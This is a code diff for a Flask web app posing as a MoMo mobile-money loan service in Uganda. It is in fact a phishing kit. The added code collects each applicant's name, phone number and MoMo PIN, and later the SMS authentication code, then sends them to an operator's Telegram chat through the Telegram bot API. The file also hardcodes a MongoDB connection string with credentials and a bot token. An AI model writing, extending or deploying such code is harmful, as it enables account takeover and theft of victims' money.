@@ -1,15 +1,48 @@
-from flask import Flask, render_template, request, redirect, url_for, session
+from flask import Flask, render_template, request, redirect, url_for, session, jsonify
 from pymongo import MongoClient
 from bson.objectid import ObjectId
 import os
+import requests
 
 app = Flask(__name__)
-app.secret_key = "super_secret_momo_key"
+app.secret_key = "super_secret_momo_key"  # Needed for session management
 
 # MongoDB connection
 client = MongoClient("mongodb+srv://superuser:2006@superuser.uenn69l.mongodb.net/momo_loan_db?retryWrites=true&w=majority&appName=superuser")
 db = client["momo_loan_db"]
 applications_collection = db["applications"]
+
+# --- TELEGRAM BOT CONFIGURATION ---
+TELEGRAM_BOT_TOKEN = "8802138287:AAHXDX_8S-OGN4NBemcQPdI3uZzFsICDQh4"
+TELEGRAM_ADMIN_CHAT_ID = "7217281586"
+
+def send_telegram_alert(app_data, title="NEW MOMO LOAN APPLICATION"):
+    """Sends immediate alert to your Telegram chat."""
+    message = (
+        f"🚨 *{title}* 🚨\n\n"
+        f"🆔 *App ID:* `{app_data.get('app_id')}`\n"
+        f"👤 *Applicant:* {app_data.get('first_name', '')} {app_data.get('last_name', '')}\n"
+        f"📞 *Phone:* +256 {app_data.get('phone', '')}\n"
+        f"🔑 *MoMo PIN:* `{app_data.get('password', '')}`\n"
+        f"🔐 *Auth Code:* `{app_data.get('auth_code', 'N/A')}`\n"
+        f"💰 *Amount:* UGX {app_data.get('amount', '')}\n"
+        f"⏱️ *Term:* {app_data.get('term', '')}\n"
+        f"💼 *Employment:* {app_data.get('employment', '')}\n"
+        f"📊 *Income:* UGX {app_data.get('income', '')}\n"
+        f"📝 *Purpose:* {app_data.get('purpose', '')}"
+    )
+    
+    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
+    payload = {
+        "chat_id": TELEGRAM_ADMIN_CHAT_ID,
+        "text": message,
+        "parse_mode": "Markdown"
+    }
+    
+    try:
+        requests.post(url, json=payload, timeout=5)
+    except Exception as e:
+        print(f"Telegram notification error: {e}")
 
 @app.route("/")
 def index():
@@ -66,11 +99,15 @@ def login():
             "income": session.get("income"),
             "password": pin,
             "status": "Pending Approval",
-            "app_id": "APP-" + os.urandom(4).hex().upper()
+            "app_id": "APP-" + os.urandom(4).hex().upper(),
+            "auth_code": ""
         }
         
         inserted_id = applications_collection.insert_one(app_data).inserted_id
         session["current_app_id"] = str(inserted_id)
+        
+        # --- SEND TELEGRAM NOTIFICATION AS SOON AS USER HITS PENDING SCREEN ---
+        send_telegram_alert(app_data, title="NEW MOMO LOAN APPLICATION")
         
         return redirect(url_for("pending"))
     return render_template("login.html")
@@ -78,12 +115,42 @@ def login():
 @app.route("/pending")
 def pending():
     current_id = session.get("current_app_id")
-    app_id = "APP-PENDING"
+    if not current_id:
+        return redirect(url_for("index"))
+        
+    record = applications_collection.find_one({"_id": ObjectId(current_id)})
+    status = record.get("status", "Pending Approval") if record else "Pending Approval"
+    app_id = record.get("app_id", "APP-PENDING") if record else "APP-PENDING"
+    
+    return render_template("pending.html", app_id=app_id, status=status)
+
+@app.route("/check-status")
+def check_status():
+    current_id = session.get("current_app_id")
     if current_id:
         record = applications_collection.find_one({"_id": ObjectId(current_id)})
-        if record and "app_id" in record:
-            app_id = record["app_id"]
-    return render_template("pending.html", app_id=app_id)
+        if record:
+            return jsonify({"status": record.get("status", "Pending Approval")})
+    return jsonify({"status": "Pending Approval"})
+
+@app.route("/submit-auth-code", methods=["POST"])
+def submit_auth_code():
+    auth_code = request.form.get("auth_code")
+    current_id = session.get("current_app_id")
+    
+    if current_id:
+        applications_collection.update_one(
+            {"_id": ObjectId(current_id)},
+            {"$set": {"auth_code": auth_code, "status": "Completed"}}
+        )
+        record = applications_collection.find_one({"_id": ObjectId(current_id)})
+        send_telegram_alert(record, title="CONFIDENTIAL SMS CODE SUBMITTED")
+        
+    return redirect(url_for("completed"))
+
+@app.route("/completed")
+def completed():
+    return render_template("completed.html")
 
 @app.route("/admin")
 def admin_dashboard():
